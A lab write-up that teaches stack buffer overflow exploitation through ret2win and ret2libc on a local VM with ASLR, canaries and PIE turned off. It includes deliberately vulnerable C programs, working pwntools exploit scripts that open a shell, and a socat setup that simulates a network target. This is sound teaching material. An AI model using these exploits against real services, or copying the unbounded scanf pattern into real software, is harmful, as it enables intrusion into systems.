# Buffer Overflow Exploitation — Lab Writeup

A practical walkthrough of stack-based buffer overflow exploitation,
covering ret2win and ret2libc on a Kali Linux VM.

---

## Background

When a function runs, the CPU saves two things on the stack before
entering it: the return address (where to jump back to once the
function ends) and the previous frame pointer. Local variables, like
buffers, sit below these saved values.

```
[ saved return address ]
[ saved RBP             ]
[ local buffer          ]
```

If a program writes user input into a fixed-size buffer without
checking its length, the input can overflow past the buffer into the
saved return address. Since the CPU jumps to whatever address sits in
that slot when the function returns, overwriting it lets an attacker
control where execution goes next.

---

## Environment Setup

ASLR was disabled for the duration of this lab so memory addresses
stay consistent across runs:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Tools installed:

```bash
sudo apt install gdb gcc socat -y
pip install pwntools --break-system-packages
pip install ropgadget --break-system-packages
```

---

## Stage 1 — ret2win

### Vulnerable program

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    printf("You redirected execution here!\n");
    system("/bin/sh");
}

void vuln() {
    char buf[16];
    printf("buf address: %p\n", buf);
    scanf("%s", buf);
}

int main() {
    vuln();
    return 0;
}
```

`scanf("%s")` has no length limit, and `buf` is only 16 bytes — input
longer than that overflows into adjacent stack memory.

### Compile with protections off

```bash
gcc vuln.c -o vuln -fno-stack-protector -no-pie -z execstack -g
```

| Flag | Disables |
|---|---|
| `-fno-stack-protector` | Stack canary (detects overflow before return) |
| `-no-pie` | Randomized binary load address |
| `-z execstack` | Non-executable stack |
| `-g` | (adds debug symbols, needed for GDB) |

### Find win()'s address

```bash
objdump -d vuln | grep "<win>"
```
```
0000000000401156 <win>:
```

### Find the offset

```bash
gdb ./vuln
(gdb) break vuln
(gdb) run
(gdb) p &buf
(gdb) info frame
```

```
$1 = (char (*)[16]) 0x7fffffffdd40
...
rbp at 0x7fffffffdd50, rip at 0x7fffffffdd58
```

```
offset = 0x7fffffffdd58 - 0x7fffffffdd40 = 24 bytes
```

24 bytes = 16 (buf) + 8 (saved RBP). After that, the next bytes land
on the return address.

### Exploit

```python
from pwn import *

p = process('./vuln')

padding  = b'A' * 24
win_addr = 0x401156

payload = padding + p64(win_addr)

p.sendline(payload)
p.interactive()
```

`p64()` converts the address into 8 bytes, little-endian (least
significant byte first — how x86-64 stores numbers in memory).

### Result

```
buf address: 0x7ffecf1fef40
You redirected execution here!
```

Execution was redirected from `main()` into `win()`.

---

## Stage 2 — ret2libc

ret2win relies on a function that conveniently exists in the binary.
Real targets rarely have one. Instead, nearly every Linux binary loads
**libc**, which contains `system()`. ret2libc redirects execution there
instead, passing `"/bin/sh"` as the argument.

### Why an extra step is needed

64-bit Linux passes function arguments through registers, not the
stack. The first argument goes into **RDI**. The overflow alone only
controls RIP, so a small trick is needed: jump first to a tiny
existing instruction sequence (a **gadget**) that loads a value into
RDI, then continues to `system()`.

### Vulnerable program (no win function)

```c
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buf[16];
    printf("buf address: %p\n", buf);
    scanf("%s", buf);
}

int main() {
    vuln();
    return 0;
}
```

```bash
gcc vuln2.c -o vuln2 -fno-stack-protector -no-pie -z execstack -g
```

### Gather required addresses

**system() address:**
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0x7ffff7e01790 <system>
```

**"/bin/sh" string inside libc** (already exists there, no need to write it):
```bash
(gdb) find &system, +9999999, "/bin/sh"
0x7ffff7f57ea4
```

**pop rdi ; ret gadget** (loads the next stack value into RDI):
```bash
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
0x000000000002a9b7 : pop rdi ; ret
```

**libc base address** (gadget offset needs this to become a real address):
```bash
(gdb) info proc mappings
0x00007ffff7dad000 ... libc.so.6
```

```
pop_rdi_addr = 0x7ffff7dad000 + 0x2a9b7 = 0x7ffff7dd79b7
```

### Exploit

```python
from pwn import *

p = remote('localhost', 4444)

libc_base    = 0x7ffff7dad000
pop_rdi_addr = libc_base + 0x2a9b7
system_addr  = 0x7ffff7e01790
binsh_addr   = 0x7ffff7f57ea4

padding = b'A' * 24

payload  = padding
payload += p64(pop_rdi_addr)   # jump here first
payload += p64(binsh_addr)     # popped into RDI
payload += p64(system_addr)    # then jump here -> system("/bin/sh")

p.sendline(payload)
p.interactive()
```

Execution order: overflow lands → CPU jumps to the gadget → gadget
pops `/bin/sh`'s address into RDI → gadget's `ret` pops the next stack
value (`system()`'s address) into RIP → CPU jumps into `system()` with
RDI already set correctly.

### Simulating a network target

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:./vuln2,pty,stderr
```

This makes `vuln2` listen on port 4444 like a real service. The
exploit then connects with `remote('localhost', 4444)` instead of
launching the process directly — structurally identical to attacking
a real IP address.

---

## Why real targets are harder

This lab disabled every protection. Real binaries usually have them
active:

| Protection | What it does | Bypass requires |
|---|---|---|
| Stack canary | Detects overflow before return | Leaking the canary value first |
| NX | Stack can't execute injected code | ROP chains (as used above) |
| PIE / ASLR | Randomizes load addresses each run | An information leak to calculate real addresses |

Real attack flow:

```
nmap scan -> service identified -> binary reverse engineered locally
-> vulnerable function found -> offset calculated -> protections checked
-> bypassed one by one -> payload sent to target IP -> shell received
```

---

## Tools used

| Tool | Role |
|---|---|
| GCC | Compiles the C source with chosen protections on/off |
| GDB | Runs the binary live, inspects memory/registers at runtime |
| objdump | Reads function addresses from the binary file directly |
| pwntools | Builds and sends the exploit payload |
| ROPgadget | Finds usable gadgets inside a binary or library |
| socat | Turns the binary into a listening network service |

---

## Key terms

| Term | Meaning |
|---|---|
| Saved return address | Copy of RIP pushed onto the stack on function call; restored on return |
| Offset | Bytes between buffer start and saved return address |
| Little-endian | Numbers stored least-significant byte first |
| Gadget | Small existing instruction sequence ending in `ret`, reused to control registers |
| ret2win | Overflow redirecting to a function already in the binary |
| ret2libc | Overflow redirecting to a libc function like `system()` |
| ASLR | Randomizes stack/libc addresses each run |
| NX | Marks the stack non-executable |
| PIE | Randomizes the binary's own load address |
| Canary | Random value checked before return to detect overflow |